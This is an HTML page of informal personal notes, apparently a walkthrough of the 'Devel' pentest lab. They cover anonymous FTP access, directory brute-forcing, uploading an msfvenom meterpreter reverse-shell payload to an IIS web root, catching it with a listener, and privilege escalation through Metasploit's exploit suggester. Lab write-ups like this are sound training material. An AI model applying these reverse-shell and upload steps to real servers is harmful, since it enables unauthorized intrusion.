@@ -1,0 +1,226 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>4.Devel</title>
+</head><body>started with nmap first <br/>
+here we will leverage ftp ka anaonymous login<br/>
+<img src="image.png" /><br/>
+<br/>
+<b>Microsoft IIS httpd 7.5</b><br/>
+this is an information disclosure though very low magnitude ka<br/>
+even <b>IIS7<br/>
+</b><img src="image 2.png" width="550" height="401" /><br/>
+<br/>
+we got this thus<br/>
+we see this a lot during pentesting<br/>
+this is &nbsp;default webpage signifies they have a website running on backedn on some directory <br/>
+this is finding as its poor hygiene<br/>
+or mgiht be just a default webpage maybe website wouldnt be there <br/>
+so first though is to look for extra directories using dirbuster:<br/>
+<br/>
+used dirbuster could also use dirb or gobuster<br/>
+type in web adress of this site in it <br/>
+<img src="image 3.png" /><br/>
+using this wordlist<br/>
+there is also big wordlist on github search dirbuster word lisst on google <br/>
+high chances of machine being microsoft as its running on msII7 na<br/>
+if apache web server php etension better<br/>
+<img src="image 4.png" width="450" height="306" /><br/>
+<br/>
+asm,asmx,asp,aspx,txt,zip,bak,rar :used these all finally <br/>
+on inpecting the page source we see that <br/>
+<img src="image 5.png" width="600" height="294" /><br/>
+<br/>
+see img src ="welcome.png"<br/>
+and that was found on nmap ka resuts too so we can put our own image too here <br/>
+sosaved image of lets say dog.jpg on desktop<br/>
+<img src="image 6.png" /><br/>
+<br/>
+login as username:anonymous <ul><li style="list-style-type: none">&nbsp; &nbsp; &nbsp;password:anonymous </li>
+</ul>
+we could go in those files for enumeration and stuff<br/>
+<img src="image 7.png" /><br/>
+<br/>
+in files like aspnet_client<br/>
+did this <br/>
+<br/>
+<img src="image 8.png" /><br/>
+<ul><li style="list-style-type: none">thus iit worked</li>
+<li style="list-style-type: none"><img src="image 9.png" width="550" height="298" /></li>
+<li style="list-style-type: none"></li>
+</ul>
+its imp coz i can put things into thiis folder and its vulnerable only when someone can execute it liek we could this tuime as anonymous login was avaailable<br/>
+thus this time we put a dog pic bt we could also have put malware onto ths site <br/>
+we ll do that using msfvenom:<br/>
+used folls site :<br/>
+https://netsec.ws/?p=331<br/>
+<img src="image 10.png" /><br/>
+<br/>
+so we ll gneerate payload basically generating malware we ll use meterppreter payload <br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe<br/>
+usingthis as we dont know 64 or 32 bit we ll start iwth 32 first<br/>
+<img src="image 11.png" /><br/>
+copied it tinto &nbsp;file so that can run t directly or else had to copy paste the shell code generated <br/>
+in new tab open msfconsole<br/>
+to run the exploit handler <br/>
+last time it was done for us this time we ll do it ourselcves<br/>
+<img src="image 12.png" /><br/>
+<br/>
+very similar to netcat it says to open up a listener and talk back to me on this ip address<br/>
+<img src="image 13.png" /><br/>
+did this <br/>
+we transfered via ascii code bt u should have transfered via binary<br/>
+type binary and put ex.aspx<br/>
+try that binary is better<br/>
+so our malware is thus iploaded via :<br/>
+<img src="image 14.png" width="550" height="199" /><br/>
+<br/>
+<img src="image 15.png" width="600" height="279" /><br/>
+<br/>
+did this <br/>
+and boom<br/>
+<img src="image 16.png" /><br/>
+<br/>
+we got a session<br/>
+<img src="image 17.png" /><br/>
+<br/>
+from getuid we see we arent highest authority one so tried wrting getsystem whcih didnt work too<br/>
+<img src="image 18.png" /><br/>
+<br/>
+getsystem can actually crash a machine beware<br/>
+<img src="image 19.png" /><br/>
+<br/>
+thus using post exploit<br/>
+post(multi/recon/local_exploit_suggester) &gt; <br/>
+<img src="image 20.png" /><br/>
+<br/>
+it will loook through all x86 exploits that are privelege escaltion explots and will look which will work for our windows system<br/>
+will return a lost of those which might work for us <br/>
+<img src="image 21.png" /><br/>
+<br/>
+we ll use kitra wala<br/>
+<img src="image 22.png" /><br/>
+<br/>
+thus it didint work for us <br/>
+<img src="image 23.png" /><br/>
+now again go tot option<br/>
+<img src="image 24.png" /><br/>
+<br/>
+coz u have to set lhost correclty whcih defaults to etheernet interface<br/>
+<img src="image 25.png" /><br/>
+<br/>
+LPORT was just changed aise hi <br/>
+thus we won<br/>
+<img src="image 26.png" /><br/>
+<br/>
+we lost sessions in between coz it closes up the older one to start exploiting with the new one <br/>
+type in msfvenom -l payloads <br/>
+and instead of running meterpreter try running windows this time<br/>
+so just do windows/shell/reverse_tcp &nbsp; &nbsp;aisa kuch and in <br/>
+new tab do nc -nvlp 4444 <br/>
+to listen for something or a shell to come across<br/>
+thusit would be manually <br/>
+also nikto could ve been run along with dirbuster <br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<ul><li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
